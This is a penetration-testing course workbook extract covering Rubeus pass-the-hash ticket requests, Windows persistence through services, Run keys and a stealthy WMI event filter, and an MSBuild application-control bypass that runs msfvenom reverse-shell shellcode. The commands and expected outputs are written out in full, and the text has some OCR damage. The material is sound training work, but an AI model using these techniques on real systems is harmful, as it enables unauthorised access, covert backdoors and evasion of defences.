|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |

# Expected Results

PS C:\Users\sec560> psexec \\10.130.10.21 cmd.exe

PsExec v2.43 - Execute processes remotely Copyright (C) 2001-2023 Mark Russinovich Sysinternals - www.sysinternals.com

Couldn't access 10.130.10.21:

The user name or password is incorrect.

PS C:\Users\sec560> Rubeus.exe asktgt /user:antivirus /domain:hiboxy.com /dc:10.130.10.4 / rc4:47f0ca5913c6e70090d7b686afb9e13e /ptt

| <br>_                   |
|-------------------------|
| ( \<br>                 |
| ) )                     |
| /        _ \         /) |
| \ \   _     _) )   _    |
| _   _ / / )/(/          |

v2.3.3

- [\*] Action: Ask TGT
- [\*] Using rc4\_hmac hash: 47f0ca5913c6e70090d7b686afb9e13e
- [\*] Building AS-REQ (w/ preauth) for: 'hiboxy.com\antivirus'
- [\*] Using domain controller: 10.130.10.4:88
- [+] TGT request successful!
- [\*] base64(ticket.kirbi):

 doIFgDCCBXygAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoQwbCkhJQk9YWS5DT02iHzAdoAMC AQKhFjAUGwZrcmJ0Z3QbCmhpYm94eS5jb22jggRWMIIEUqADAgESoQMCAQKiggREBIIEQOUL3x4RY8IA fkKcDeuWOY3N0fYb7dQOkGzcP7qMBaMXeG0hAUb2e3KsfQIwYEecoRoh35QXVqtTk/zCpG86uwEtFM6F 2u/nJPiFt5YRa2GiQp7NrcFSJzE5HwYCMpA2F80r3OkeUXSFmXpZKBzlaLppia4PBXDLAHC0fT0CN3oW RjGKHgHG84KoyMdKbNmyXNTzQaW3QOxnZDZUS+fdToupUV089MypBBXAtfDlGz49q+xzljZ5L3A70h2l zJJGlbgN1RzPrzvoz8xzo7nb/kjDQfAeE8IngFkpOZqJKGSvTFo7nm6VERpjIMLFP/3nrS4xUOVg6Nej facCINKOSyLJ+XaU5QybM3KZ5cJ6t95TVn9VvFkcJxSGW9O6jzpR7ruKDnMgYE05cMyA5VTbujXX6vSl 1gNwWkaBd5Mof3cQ3ObwOT0l2G0D9j2gUi+nhc3mjn7cJ3mflmgeq9Fyiw+3+E1AnAkxB3JMO5uUJovp os7pD4jwk3g+oWH8sMuMHJehZajeoxRiif6EKNhMdgIxvBLzOXvKfSy0Ft++zZEaW9+3CsGH71ur50pf IJleZpnoNnwaKnqL/OQ5HiJ0P6KIbxAvdOOZJUTH4rnSP7XfGWq7gcAwg6knC0qLQQ6ou2Ysy5D4nw/S /KgQrO9Blf5i4SZXCCfkf1aEwG+SoUfxqKw4Lcl5iG38dvrJp9BNDihw9fUnkfFmf7Xej05IL+9T9iIW 03Xd1gSqrYPYbUSVA6DD0tSZfg67r/KsfIazqPHDosS2iks4zgl8k4CSKdLCgH5zXnvtY8jfEaSjFxOZ 2iu3cdnCF7G47RLcbbAP7ZuzMPwX45h0Q0l8K2nzhq/sqCw9Qa8F1tPQlOJTX4lKcT/M4dGaYfe0FH9J 2gVxdg+OlQLXAm64/SK7Zwxxs1n+rJht5/8CWq6T1olBzzWqQtBOKk6B7yKHTuEulryYAmnuEs9KOXiW lshTQWUg9U8A7uWBqENoVqo1UiO2GmJdDhLZ61wmk/tvdJgA447MKzAfp18kCUJVzRj2V137ytRE5WG+ 96q1S/2O0RYNjze1wn9sdl1C48yDv7vOWTKOTt7+ezXKJRhiezfJjYwyouW/ZzxQIKWJ+p2sKb7XW6IU UzYJOdQ/5wWo/SoJ+T/+fTkoEyc00yKR2Fo1m685pv1kMx1dxzqXlGsbM7lnEDNu758wChwyvEYjxLci HOXG3gOG5wBNk0i1bZe2hpDUeajXXNgOmvlRzkKlRyZRHEkdymSDTG12v3jInYTSi7jzUxppYSe1CrJm r7wO4W2nsy4KCvZy4Nm8NCEW/pycRSk1AI0fQBKlR8HjdRWNh4Jz7Mpv6CDn+QZ+i5WHKfWYtLiPzgzA 83YFKfS3wvpBt24Wn2eMbFGIOprBIhLtVQgqHpyUV00tkzWxD2nuAvBErB7dPAlUiiDbWdZTs6IQx8YD o4HRMIHOoAMCAQCigcYEgcN9gcAwgb2ggbowgbcwgbSgGzAZoAMCARehEgQQCSQy3TpVzXLp4TCC9yGk  vaEMGwpISUJPWFkuQ09NohYwFKADAgEBoQ0wCxsJYW50aXZpcnVzowcDBQBA4QAApREYDzIwMjQxMDAy MTkyMjA3WqYRGA8yMDI0MTAwMzA1MjIwN1qnERgPMjAyNDEwMDkxOTIyMDdaqAwbCkhJQk9YWS5DT02p HzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmhpYm94eS5jb20=

[+] Ticket successfully imported!

ServiceName : krbtgt/hiboxy.com ServiceRealm : HIBOXY.COM

UserName : antivirus (NT\_PRINCIPAL)

UserRealm : HIBOXY.COM

StartTime : 10/2/2024 12:22:07 PM EndTime : 10/2/2024 10:22:07 PM RenewTill : 10/9/2024 12:22:07 PM

Flags : name\_canonicalize, pre\_authent, initial, renewable,

forwardable

KeyType : rc4\_hmac

Base64(key) : CSQy3TpVzXLp4TCC9yGkvQ==

ASREP (key) : 47F0CA5913C6E70090D7B686AFB9E13E

# Did you get a KRB\_AP\_ERR\_SKEW error?

If you received a KRB\_AP\_ERR\_SKEW error, your Windows VM's clock is likely out of sync with the domain controller's clock by more than 5 minutes. Change the Windows VM's time to match the current time (using https://time.is or similar) and re-run the command. After setting the time, try the Rubeus asktgt command again.

First, we see that we can't PsExec to 10.130.10.21 using the credentials that we have now. We'll get a Ticket-Granting Ticket as the antivirus user using the hash we obtained earlier to solve that.

With how we've used Rubeus, this new TGT is injected into the current process (via the /ptt option). The good news is that Windows handles retrieving service tickets automatically and transparently (the step referred to as "Asking for an Introduction" in the Kerberos section of the courseware). However, if you don't ask for a service by name, you won't be using Kerberos (which depends upon Service Principal Names in practice).

Let's demonstrate this issue by first attempting to access JUMP01.hiboxy.com (10.130.10.21) over SMB by its IP address, accessing its hidden administrative C\$ share:

#### Command

dir \\10.130.10.21\C\$

# Expected Results

PS C:\Users\sec560> dir \\10.130.10.21\C\$

Get-ChildItem: Cannot find path '\\10.130.10.21\C\$' because it does not exist.

This is a common point of confusion for penetration testers. When performing actions via Kerberos, you generally need to be accessing by name, not by IP. As penetration testers, we generally have two main approaches to solving this problem:

- Add the client's domain controller as our resolver for any host under hiboxy.com (or generally, the client's Active Directory domain(s)) 1.
- By editing the hosts file ( C:\Windows\system32\drivers\etc\hosts ) and adding any needed entries manually, bypassing DNS entirely 2.

Luckily, we've already added the DC as our DNS resolver for entries under hiboxy.com, so we can simply show that resolution is working properly, then access the same server (JUMP01.hiboxy.com / 10.130.10.21) using its name, instead:

![](SEC560_WorkBook2_page_116_Figure_4.jpeg)

If you have more time, as an optional step you can run something like psexec \\JUMP01.hiboxy.com cmd.exe inside this command prompt to gain code execution on the target machine, as well.

To clean up, simply close the PowerShell window on your Windows VM, and all the terminal windows on your Linux VM.

# Conclusion

In this lab, you've authenticated to a target machine via SMB as an administrative user with the user's hash (not the password). You passed the hash using Metasploit's psexec module. These techniques are highly useful for penetration testers who have retrieved hashes from a target environment and have *SMB* access to target Windows machines.

Other protocols are also susceptible to Pass-the-Hash attacks. Fundamentally, if the secret in the challenge/response protocol is the hash, then the hash can be used to authenticate. While examples outside of on-premise Windows authentication are less common to see, they do exist.

For example, the PostgreSQL database server used MD5 hashes for challenge-response authentication, and was susceptible to pass-the-hash. While they've since moved to SCRAM-SHA-256 by default, the old MD5 hashes are still supported for backwards compatibility.

If you're curious, there's a Hashcat forum post explaining the vulnerability .

# *Lab 5.1: Persistence*

# No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

# Background

Hiboxy might detect some of your activities and attempt to remove your access. To ensure continued access throughout the

From Windows services that survive reboots to registry run keys that activate on user login, you'll demonstrate various persistence techniques. The WMI event filter persistence proves particularly stealthy - triggering only on failed login attempts for a nonexistent user, providing you with a reliable backdoor that's unlikely to be discovered through routine security checks.

→

# Lab Setup

VM used:

- Linux •
- Windows •

# Lab – Step-by-Step Instructions

#### Command

Setup a listener on port 443 by running https to start the listener.

![](SEC560_WorkBook2_page_119_Figure_0.jpeg)

Let's take a look at the options with generate.

# Command generate -h Expected Results ...trimmed for brevity... Flags: ====== -a, --arch string cpu architecture (default: amd64) -c, --canary string canary domain(s) -d, --debug enable debug features -O, --debug-file string path to debug output -G, --disable-sgn disable shikata ga nai shellcode encoder -n, --dns string dns connection strings -e, --evasion enable evasion features (e.g. overwrite user space hooks) -E, --external-builder use an external builder -f, --format string Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe) -h, --help display help ...trimmed for brevity...

Notice that we can create a service format. This format will properly respond to the service controller and will not die after 30 seconds.

Let's create two payloads, one for a service and then one for a standard executable.

NOTE: Change LINUX\_ETH0\_ADDRESS with the IP address of you SEC560 Linux VM's eth0 IP address.

generate --os windows --arch 64bit --skip-symbols --format service --name service --http https://LINUX\_ETH0\_ADDRESS

generate --os windows --arch 64bit --skip-symbols --format exe --name payload --http https:// LINUX\_ETH0\_ADDRESS

# Expected Results

name service --http https://10.10.10.186

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [\*] Build completed in 3s
- [\*] Implant saved to /home/sec560/service.exe

payload --http https://10.10.10.186

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [\*] Build completed in 2s
- [\*] Implant saved to /home/sec560/payload.exe

In a real pen test, we would probably want to limit our access and prevent the payload from executing after the allotted testing window is over. We could use the -w or --limit-datetime options for that purpose.

Now that we have the files, we need to transfer them to Windows.

#### *3: Transfer files to Windows*

# Open a new terminal for this step.

The files are currently owned by the root user. Let's confirm this by looking at the files.

```
Command
 ls -l *.exe
 Expected Results
   sec560@560vm:~$ls -l *.exe
   -rwx------ 1 root root 10981376 Aug 16 03:11 payload.exe
   -rwx------ 1 root root 10994176 Aug 16 03:11 service.exe
```

As you can see above, the files have the rwx permissions, but only for the owner of the file, root .

Change the exe file ownership to the sec560 user and then confirm ownership of the files.

```
Command
 sudo chownsec560:sec560*.exe
 ls -l *.exe
 Expected Results
   sec560@560vm:~$sudo chownsec560:sec560*.exe
   sec560@560vm:~$ls -l *.exe
   -rwx------ 1 sec560 sec560 10981376 Aug 16 03:11 payload.exe
   -rwx------ 1 sec560 sec560 10994176 Aug 16 03:11 service.exe
```

Now we need to run a web server so we can get the files in Windows. Run the Python web server.

```
Command
 python3 -m http.server
 Expected Results
   sec560@560vm:~$python3 -m http.server
   Serving HTTPon 0.0.0.0 port 8000 ( http://0.0.0.0:8000/ ) ...
```

Next, we will switch to Windows and download the files with PowerShell. Switch to the Windows VM (logged on as the sec560 user) and open up a PowerShell window by clicking the Terminal shortcut on the desktop, where we'll download the payload files to your Desktop.

#### Command

NOTE: Replace LINUX\_ETH0\_ADDRESS with the IP address of your Linux VM's eth0 IP address. Your output will likely be different than the results displayed below.

#### cd Desktop

curl.exe -s http://LINUX\_ETH0\_ADDRESS:8000/payload.exe -o payload.exe curl.exe -s http://LINUX\_ETH0\_ADDRESS:8000/service.exe -o service.exe

# Expected Results

- PS C:\Users\sec560> cd Desktop
- PS C:\Users\sec560\Desktop> curl.exe -s http://192.168.211.128:8000/payload.exe -o payload.exe
- PS C:\Users\sec560\Desktop> curl.exe -s http://192.168.211.128:8000/service.exe -o service.exe

Now that we have the files on Windows, let's create the first persistence using a service.

### *4: Service Persistence*

We are first going to manually create a service. For now, we'll just use the command as-is and create a service named persist .

#### Command

sc.exe create persist binpath= "c:\Users\sec560\Desktop\service.exe" start= auto

# Expected Results

PS C:\Users\sec560\Desktop> sc.exe create persist binpath= "c:

\Users\sec560\Desktop\service.exe" start= auto

[SC] CreateService SUCCESS

PS C:\Users\sec560\Desktop>

If you receive an "Access Denied" message, you need to make sure your Terminal tab says Administrator: in the title.

# Expected Results

[\*] Session 6392c9a2 service - 10.10.10.165:49686 (SEC560-Windows) - windows/amd64 - Fri, 16 Aug 2024 03:17:13 UTC

Interact with this session by using the first two characters of the session ID using sessions -i . In this example it is 6392c9a2 so we use the shortened ID of 63. Your session ID will be different!

# Command sessions -i 63 Expected Results [\*] Active session service (6392c9a2)

Let's see what level of access we have with whoami.

# Command whoami Expected Results Logon ID: NT AUTHORITY\SYSTEM [\*] Current Token ID: NT AUTHORITY\SYSTEM

As you can see, the service runs as SYSTEM giving us a high level of access with this persistence mechanism.

Let's background this session to prepare for the next step:

# Command background Expected Results [\*] Background ...

Let's clean up on Windows by killing and deleting the service.

Open a PowerShell window by clicking on the Terminal shortcut of your Windows VM desktop, then remove the service with the following commands:

# Command sc.exe delete persist Expected Results PS C:\Users\sec560> sc.exe delete persist [SC] DeleteService SUCCESS

process ( service.exe ) on the Windows side.

#### *5: HKCU Run Persistence*

On your Windows VM, run the reg command below to create the registry key for the current user.

reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG\_SZ/F /D "C:\Users\sec560\Desktop\payload.exe"

# Expected Results

PS C:\Users\sec560> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG\_SZ /F /D "C:\Users\sec560\Desktop\payload.exe" The operation completedsuccessfully.

The options for the command are:

- reg the command to run. •
- add add a key. •
- "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" the location to add the key. •
- /V "User Persist" name of the key (Value). •
- /t REG\_SZ type String. •
- /F force, overwrite if it exists. •
- /D "C:\Users\sec560\Desktop\payload.exe" data, the executable to run. •

We could have used HKLM (HKEY Local Machine) instead, and this would work for any user logging to the system, but it requires elevated access to use this key. We are using HKCU (HKEY Current User) so that it doesn't require elevated access.

To test this, log out of Windows and the log back in as the sec560 This may take 1-2 minutes.

# Expected Results

[\*] Session b73df7f2 payload - 10.10.10.165:49721 (SEC560-Windows) - windows/amd64 - Fri, 16 Aug 2024 17:17:06 UTC

Interact with this session by using the first two characters of the session ID using sessions -i . In this example it is b73df7f2 so we use the shortened ID of b7. Your session ID will be different!

![](SEC560_WorkBook2_page_127_Picture_0.jpeg)

Run whoami to see the current access.

![](SEC560_WorkBook2_page_127_Picture_2.jpeg)

Again, let's background this session to prepare for the next step:

![](SEC560_WorkBook2_page_127_Picture_4.jpeg)

Let's clean up and remove this key. Switch over to your Windows VM, then use your PowerShell window again and delete the key:

reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /F

# Expected Results

PS C:\Users\sec560> reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /F

The operation completedsuccessfully.

The options for the command are:

- reg the command to run. •
- delete delete a key. •
- "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" the location to delete the key. •
- /V "User Persist" name of the key (Value). •

#### *6: WMI Event Filter Persistence*

WMI Event Filters allow for a lot of flexibility on how to trigger our payload. We are going to setup an event listener for a failed login (event ID 4625) for the user fakeuser . This will allow us to trigger our payload for a failed login for a non-existent user!

We'll use the PowerShell commands below to setup the filter.

There are three parts to the setup.

- The first command we will use will setup the Event Filter -Class \_\_EventFilter with a name of UPDATER. The query then looks for failed logins (Event ID 4625) where the login matches fakeuser . 1.
- The second piece sets up the consumer, or what to do when the filter matches. In this case we are going to have matches to our UPDATER filter run our payload located at C:\Users\sec560\Desktop\payload.exe . 2.
- The final piece sets up the binding to look for the trigger and run our consumer (payload). 3.

The commands here are quite complicated. Please copy and paste these commands into your administrative PowerShell prompt.

\$filter = Set-WmiInstance-Namespaceroot/subscription -Class \_\_EventFilter -Arguments @{EventNamespace ='root/cimv2'; Name ="UPDATER";Query = "SELECT \* FROM \_\_InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32\_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%fakeuser%'"; QueryLanguage= 'WQL'}

\$consumer= Set-WmiInstance-Namespaceroot/subscription -Class CommandLineEventConsumer-Arguments@{Name= "UPDATER"; CommandLineTemplate = "C:\Users\sec560\Desktop\payload.exe"}

\$FilterToConsumerBinding =Set-WmiInstance -Namespace root/subscription-Class \_\_FilterToConsumerBinding -Arguments@{Filter = \$Filter; Consumer = \$Consumer}

These commands have no output.

Now that we've setup the filter, switch to Linux, open a new terminal and attempt to login with smbclient and our fakeuser . It make take a while for the filter to detect the login. You may need to wait up to a minute.

#### Command

NOTE: Replace WINDOWS\_ETHERNET0\_ADDRESS with the local Windows IP Address (NOT the VPN address beginning with 10.254.x.x).

smbclient --password=badpassword'\\WINDOWS\_ETHERNET0\_ADDRESS\c\$' -U fakeuser

# Expected Results

sec560@560vm:~\$smbclient --password=badpassword'\\10.10.10.165\c\$' -U fakeuser session setup failed: NT\_STATUS\_LOGON\_FAILU

# Expected Results

[\*] Session a1233cb9 payload - 10.10.10.165:50796 (SEC560-Windows) - windows/amd64 - Fri, 16 Aug 2024 18:06:50 UTC

Interact with this session by using the first two characters of the session ID using sessions -i . In this example it is a1233cb9 so we use the shortened ID of a1. Your session ID will be different!

# Command sessions -i a1 Expected Results [\*] Active session payload (a1233cb9)

Once again, let's see what user we are running as with whoami.

# Command whoami Expected Results Logon ID: NT AUTHORITY\SYSTEM [\*] Current Token ID: NT AUTHORITY\SYSTEM

You can see that this gives SYSTEM level access on Windows. If we were to lose access all we would need to do is attempt to login as the non-existent fakeuser again to get a new session.

The method we used here is manual and somewhat complicated, and it is important to understand the basics of how this works. However, there are other options to do this more easily:

- Metasploit use the windows/local/wmi\_persistence module. •
- Empire use the persistence/elevated/wmi module. •

Let's remove this filter, the binding, and the consumer using the existing PowerShell window you have open.

```
# Remove the FilterToConsumerBinding related to 'UPDATER'
$bindings = Get-WmiObject-Namespaceroot\subscription -Class __FilterToConsumerBinding
foreach ($binding in $bindings) {
 # Extract the names from the Filter and Consumer properties
 if ($binding.Filter -match 'Name="([^"]+)"') { $filterName = $Matches[1]} else {
$filterName = '' }
 if ($binding.Consumer-match 'Name="([^"]+)"') { $consumerName= $Matches[1]} else {
$consumerName= '' }
 if ($filterName -eq 'UPDATER' -or $consumerName -eq'UPDATER'){
      # Delete the binding
      ([WMI]$binding.__PATH).Delete()
 }
}
# Remove the Event Filter named 'UPDATER'
$eventFilter = Get-WmiObject-Namespaceroot\subscription -Class __EventFilter -Filter
"Name='UPDATER'"
if ($eventFilter) {
 ([WMI]$eventFilter.__PATH).Delete()
}
# Remove the Event Consumer named 'UPDATER'
$eventConsumer= Get-WmiObject -Namespace root\subscription-Class CommandLineEventConsumer -
Filter "Name='UPDATER'"
if ($eventConsumer) {
 ([WMI]$eventConsumer.__PATH).Delete()
}
```

# Expected Results PS C:\Users\sec560> # Remove the FilterToConsumerBinding related to 'UPDATER' PS C:\Users\sec560> \$bindings = Get-WmiObject -Namespace root\subscription-Class \_\_FilterToConsumerBinding PS C:\Users\sec560> PS C:\Users\sec560> foreach (\$binding in \$bindings) { >> # Extract the names from the Filter and Consumer properties >> if (\$binding.Filter -match 'Name="([^"]+)"') { \$filterName = \$Matches[1]} else { \$filterName = '' } >> if (\$binding.Consumer-match 'Name="([^"]+)"') { \$consumerName= \$Matches[1]} else { \$consumerName= '' } >> >> if (\$filterName -eq 'UPDATER' -or \$consumerName -eq'UPDATER'){ >> # Delete the binding >> ([WMI]\$binding.\_\_PATH).Delete() >> } >> } PS C:\Users\sec560> PS C:\Users\sec560> # Remove the Event Filter named 'UPDATER' PS C:\Users\sec560> \$eventFilter = Get-WmiObject-Namespaceroot\subscription -Class \_\_EventFilter -Filter "Name='UPDATER'" PS C:\Users\sec560> if (\$eventFilter) { >> ([WMI]\$eventFilter.\_\_PATH).Delete() >> } PS C:\Users\sec560> PS C:\Users\sec560> # Remove the Event Consumer named 'UPDATER' PS C:\Users\sec560> \$eventConsumer= Get-WmiObject-Namespaceroot\subscription -Class CommandLineEventConsumer -Filter"Name='UPDATER'" PS C:\Users\sec560> if (\$eventConsumer){ >> ([WMI]\$eventConsumer.\_\_PATH).Delete() >> } PS C:\Users\sec560>

exit and then stop the Python web server with CTRL-C in your Linux terminal.

#### Conclusion

We've used a number of different methods to maintain our access on Windows systems. The option you use depends on your level of access and how you choose to hide. Maintaining access through persistence is a very important part of pen testing. Working hard to gain access and then losing it is infuriating for any tester!

# *Lab 5.2: MSBuild*

# No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

# Background

Hiboxy has application control on some critical systems, blocking traditional executable payloads. However, their trust in Microsoft-signed binaries provides an opportunity for bypass. Not all Microsoft-signed binaries should be trusted, especially those that can execute arbitrary code.

Using MSBuild, a legitimate development tool present on most Windows systems, you'll execute arbitrary code by crafting malicious project files. This "living off the land" technique demonstrates why application control solutions must be carefully configured to prevent abuse of trusted system binaries while still allowing legitimate business operations.

→

# Lab Setup

VMs used:

- Linux •
- Windows •

# Lab – Step-by-Step Instructions

#### *1: Setup*

We will be using your local Windows and Linux VMs for this lab exercise. First, let's start with a sample XML file to prove we can execute arbitrary code using MSBuild.

On your Windows host, open the build1.xml file in the CourseFiles directory linked on your desktop.

![](SEC560_WorkBook2_page_134_Figure_0.jpeg)

We will be replacing the line of code highlighted below with our chosen code.

```
Original text
 public override bool Execute()
 {
 //PUT CODE TO EXECUTE HERE;
 return true;
```

#### *2: Initial Testing*

Replace this line:

```
Original text
 //PUT CODE TO EXECUTE HERE;
```

With this code:

# Replacement text Console.WriteLine("Hello SEC560!");

The replacement code will simply print *Hello SEC560!*. The full XML file should look like this:

```
Text after replacement
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
  <ClassExample />
  </Target>
  <UsingTask
  TaskName="ClassExample"
  TaskFactory="CodeTaskFactory"
  AssemblyFile="C:
 \Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
  <Task>
  <Code Type="Class" Language="cs">
  <![CDATA[
  using System;
  using System.Runtime.InteropServices;
  using Microsoft.Build.Framework;
  using Microsoft.Build.Utilities;
  public class ClassExample : Task, ITask
  {
  public override bool Execute()
  {
  Console.WriteLine("Hello SEC560!");
  return true;
  }
  }
  ]]>
  </Code>
  </Task>
  </UsingTask>
 </Project>
```

Save your build1.xml file. Open a PowerShell terminal (using the Terminal shortcut on your Windows desktop) and find MSBuild.exe using the following command:

ls C:\Windows msbuild.exe -Recurse 2>\$null | % FullName

# Expected Results

PS C:\Windows\Microsoft.NET\Framework\v2.0.50727> ls C:\Windows msbuild.exe -Recurse 2>\$null | % FullName

C:\Windows\assembly\GAC\_32\MSBuild\3.5.0.0\_\_b03f5f7f11d50a3a\MSBuild.exe

C:\Windows\assembly\GAC\_64\MSBuild\3.5.0.0\_\_b03f5f7f11d50a3a\MSBuild.exe

C:

\Windows\Microsoft.NET\assembly\GAC\_32\MSBuild\v4.0\_4.0.0.0\_\_b03f5f7f11d50a3a\MSBuild.exe

C:

\Windows\Microsoft.NET\assembly\GAC\_64\MSBuild\v4.0\_4.0.0.0\_\_b03f5f7f11d50a3a\MSBuild.exe

C:\Windows\Microsoft.NET\Framework\v2.0.50727\MSBuild.exe

C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe

C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe

C:\Windows\Microsoft.NET\Framework64\v2.0.50727\MSBuild.exe

C:\Windows\Microsoft.NET\Framework64\v3.5\MSBuild.exe

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe

C:

\Windows\WinSxS\amd64\_msbuild\_b03f5f7f11d50a3a\_10.0.26100.1\_none\_ddc589fe5044ffed\MSBuild.exe C:

\Windows\WinSxS\amd64\_msbuild\_b03f5f7f11d50a3a\_3.5.26100.1\_none\_97b37ed8879d1c57\MSBuild.exe C:

\Windows\WinSxS\amd64\_msbuild\_b03f5f7f11d50a3a\_4.0.15912.0\_none\_de1bfcc9998a681e\MSBuild.exe C:

\Windows\WinSxS\wow64\_msbuild\_b03f5f7f11d50a3a\_4.0.15912.0\_none\_07ea43e35ad4fd3b\MSBuild.exe C:

\Windows\WinSxS\x86\_msbuild\_b03f5f7f11d50a3a\_10.0.26100.1\_none\_2572c0d564c128f3\MSBuild.exe C:

\Windows\WinSxS\x86\_msbuild\_b03f5f7f11d50a3a\_3.5.26100.1\_none\_3b94e354cf3fab21\MSBuild.exe

Let's select the following MSBuild.exe:

C:\Windows\Microsoft.NET\assembly\GAC\_32\MSBuild\v4.0\_4.0.0.0\_\_b03f5f7f11d50a3a\MSBuild.exe

This one is 32-bit, so our shellcode needs to be 32-bit as well. If you were to select a different MSBuild above, you'll have to change your payload to match.

Let's copy the filename and path, and paste it into the terminal:

- Drag to select the path 1.
- Press Enter to copy the selected path into the clipboard 2.
- Right-click to paste 3.

You can then type the full path to the build1.xml file. Your command should look like this:

# Command

C:\Windows\Microsoft.NET\assembly\GAC\_32\MSBuild\v4.0\_4.0.0.0\_\_b03f5f7f11d50a3a\MSBuild.exe C: \CourseFiles\build1.xml

When you press enter you should see this output:

# Expected Results

PS C:\Users\sec560> C:\Windows\Microsoft.NET\assembly\GAC\_32\MSBuild\v4.0\_4.0.0.

0\_\_b03f5f7f11d50a3a\MSBuild.exeC:\CourseFiles\build1.xml

Microsoft (R) Build Engine version 4.8.9032.0

[Microsoft .NET Framework, version 4.0.30319.42000]

Copyright (C) Microsoft Corporation. All rights reserved.

Build started 8/21/2024 3:25:08 PM.

Hello SEC560!

# Build succeeded.

- 0 Warning(s)
- 0 Error(s)

Time Elapsed00:00:00.42

If you received an error, double check that you added the code. Also, make sure you have a semicolon (; ) at the end of the line.

# *3: Meterpreter Shellcode*

First, let's make sure our VMs can communicate. In Windows, attempt to ping your Linux host eth0 interface's IP address.

# Command

ping LINUX\_ETH0\_ADDRESS

# Replace LINUX\_ETH0\_ADDRESS!

Replace LINUX\_ETH0\_ADDRESS with the address of your Linux VM's eth0 interface (NOT the address like 10.254.25X.X on tun0).

Let's switch to Linux so we can use Metasploit and msfvenom.

First, let's launch msfconsole and setup up a listener to receive a connection from our new payload.

## Command

#### msfconsole

When you launch msfconsole, you *may* be prompted to answer a few questions.

- At the first prompt press Enter to accept the default (NOT start the webservice) 1.
- At the second prompt, type yes (delete existing data and configurations) 2.

We'll set the following options:

- Exploit: use exploit/multi/handler . •
- Payload: set payload windows/meterpreter/reverse\_tcp (default). •
- LHOST: set lhost 0.0.0.0 (0.0.0.0 will listen on all interfaces). •
- LPORT: set lport 3333 . •

We'll then confirm the settings are correct and then start the listener by executing the run command.

# Command

use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost 0.0.0.0 set lport 3333

# Expected Results

msf6 > use exploit/multi/handler [\*] Using configured payload generic/shell\_reverse\_tcp msf6 > set payload windows/meterpreter/reverse\_tcp payload => windows/meterpreter/reverse\_tcp msf6 exploit(multi/handler) > set lhost 0.0.0.0 lhost => 0.0.0.0 msf6 exploit(multi/handler) > set lport 3333 lport => 3333

Confirm your settings.

# Command show options Expected Results msf6 exploit(multi/handler) > show options Payload options (windows/meterpreter/reverse\_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 0.0.0.0 yes The listen address (an interface may be specified) LPORT 3333 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target View the full module info with the info, or info -d command.

Now, let's start the handler.

![](SEC560_WorkBook2_page_139_Figure_2.jpeg)

# Curious about AutoLoadExtensions?

There's an upstream bug with Metasploit, where the unhook extension causes meterpreter to crash against recent Windows builds. The workaround is to add AutoLoadExtensions=stdapi to the run command. Normally that list includes unhook, which causes the issue.

#### Open up a new terminal or tab for this next step.

We need to generate shellcode using msfvenom. Use the command below, but make sure you use your Linux IP address for eth0 .

First, let's take a look at the payload output formats.

![](SEC560_WorkBook2_page_140_Figure_3.jpeg)

In the list you will see csharp, which is shellcode in a byte format that is compatible with the C# programming language.

msfvenom -p windows/meterpreter/reverse\_tcp lhost=eth0 lport=3333 -f csharp | tee /tmp/payload.txt

# Expected Results

sec560@560vm:~\$ msfvenom -p windows/meterpreter/reverse\_tcp lhost=eth0 lport=3333 -f csharp | tee /tmp/payload.txt

- [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
- [-] No arch selected, selecting arch: x86 from the payload

No encoder specified, outputting raw payload

Payload size: 354 bytes

Final size of csharp file: 1830 bytes

byte[] buf = new byte[354] {0xfc,0xe8,0x8f,0x00,0x00,0x00,

0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,

..truncated for brevity...

We need to get this file to Windows. Change to the /tmp directory and launch a simple HTTP server.

# Command

cd /tmp python3 -m http.server

Go back to Windows and browse to your Linux IP address on port 8000. Then open the payload.txt file.

![](SEC560_WorkBook2_page_142_Figure_0.jpeg)

Copy all the text from payload.txt and paste it into build2.xml just below the line that says // PUT YOUR SHELLCODE HERE; . Note that indentation does not matter.

![](SEC560_WorkBook2_page_143_Figure_0.jpeg)

Save your build2.xml file. Now, let's launch our payload!

![](SEC560_WorkBook2_page_143_Figure_2.jpeg)

The terminal will then wait, because we should now have a session in Metasploit.

#### Switch back to your Linux VM for this next step

# Expected Results

[\*] Sending stage (176198 bytes) to 10.10.10.153

[\*] Meterpreter session 1 opened (10.10.10.142:3333 -> 10.10.10.153:49785) at 2024-08-21 22:41:27 +0000

meterpreter >

# Command

sysinfo

# Expected Results

meterpreter > sysinfo

Computer : SEC560-WINDOWS

OS : Windows 11 (10.0 Build 26100).

Architecture : x64 System Language : en\_US Domain : WORKGROUP

Logged On Users : 2

Meterpreter : x86/windows

# Command

getuid

#### Expected Results

meterpreter > getuid

Server username: SEC560-WINDOWS\sec560

